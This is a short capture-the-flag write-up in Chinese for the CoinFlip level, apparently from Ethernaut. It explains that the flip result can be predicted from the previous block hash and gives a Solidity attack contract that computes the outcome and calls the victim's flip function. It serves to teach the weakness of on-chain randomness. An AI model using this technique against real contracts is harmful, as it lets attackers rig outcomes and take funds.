### CoinFilp
因為這個區塊號可以很容易地獲取，我們還可以產生拋硬幣的結果，並將這個結果提供給 `flip` 函數以獲得正確的猜測和增量 `consecutiveWins`。
我們之所以能夠做到這一點，是因為網路的阻塞時間夠長，因此 `block.number` 在函數呼叫之間不會改變。

我們將使用幾乎相同的硬幣翻轉生成程式碼編寫一個 Solidity 合約（在 Remix IDE 上），`CoinfileAttack` 並在部署的實例位址處呼叫 `flip` 給定 `CoinFlip` 合約，並已確定翻轉結果：
- Ans:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./coinfilp.sol";

contract coinfileAttack {

    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
    }

    function filp() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFilp = uint256(blockValue/FACTOR);
        bool side = coinFilp == 1 ? true : false;

        victimContract.flip(side);
    }
    
}
```
```
await contract.consecutiveWins()
```

